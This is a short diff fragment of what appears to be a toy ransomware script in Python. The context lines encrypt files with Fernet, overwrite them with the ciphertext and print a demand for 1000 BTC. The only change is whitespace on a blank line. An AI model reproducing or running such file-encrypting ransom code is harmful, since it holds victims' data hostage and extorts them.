@@ -24,5 +24,5 @@ else:
         encrypted_contents = Fernet(key).encrypt(contents)
         with open(file, "wb") as thefile:
             thefile.write(encrypted_contents)
-    
+            
     print("\nYour files are encrypted!!! Send me 1000 BTC!!!\n")
